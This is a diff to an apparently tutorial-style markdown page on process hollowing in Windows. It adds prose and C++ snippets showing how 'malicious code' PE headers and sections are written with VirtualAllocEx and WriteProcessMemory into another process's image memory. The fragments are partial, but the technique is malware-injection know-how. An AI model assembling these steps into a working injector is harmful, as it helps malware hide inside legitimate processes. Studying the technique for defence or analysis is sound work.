@@ -195,6 +195,8 @@ Here are some common Sections in PE Files.
 | `.tls`   | Contains data for thread-local storage.                                                 | Read-write          |
 | `.debug` | Contains debugging information.  
 
+So i encourage you to do your homeworks about these stuffs, now let's break down the code.
+
 ```cpp
     PVOID pRemoteImage = VirtualAllocEx(
         pProcessInfo->hProcess,
@@ -209,14 +211,6 @@ Here are some common Sections in PE Files.
         printf("VirtualAllocEx call failed\r\n");
         return;
     }
-
-
-    printf(
-        "Source image base: 0x%p\r\n"
-        "Destination image base: 0x%p\r\n",
-        pSourceHeaders->OptionalHeader.ImageBase,
-        pPEB->ImageBaseAddress
-    );
 
     printf("Writing headers\r\n");
 
@@ -254,5 +248,25 @@ Here are some common Sections in PE Files.
         }
     }    
 ```
+First, as we said before, we allocate space to contain our malicious code in the unmapped memory. we grap the size of the code to allocate from the code PE header using ``` pSourceHeaders->OptionalHeader.SizeOfImage ```.
 
+After that, we start to write our code PE headers and sections on the allocated memory using WriteProcessMemory(), taking as parameters the pbuffer ( holds our code ) and the base adress to where it should start writing which is the PEB base adress
+
+Starting by writing the PE headers, this part in the code explains itself by taking just the size of headers from the buffer.
+
+```cpp
+if (!WriteProcessMemory(
+        pProcessInfo->hProcess,                 
+        pPEB->ImageBaseAddress, 
+        pBuffer, 
+        pSourceHeaders->OptionalHeader.SizeOfHeaders, 
+        0
+    ))
+    {
+        printf("Error writing process memory\r\n");
+        return;
+    }
+```
+Passing now to writing the sections, the for loop iterate trought the number of sections and write each one.
+Note that the line  ``` PVOID pSectionDestination = (PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress); ``` serves the updated adress where we can write the coming sections ( it's like one under one )
 
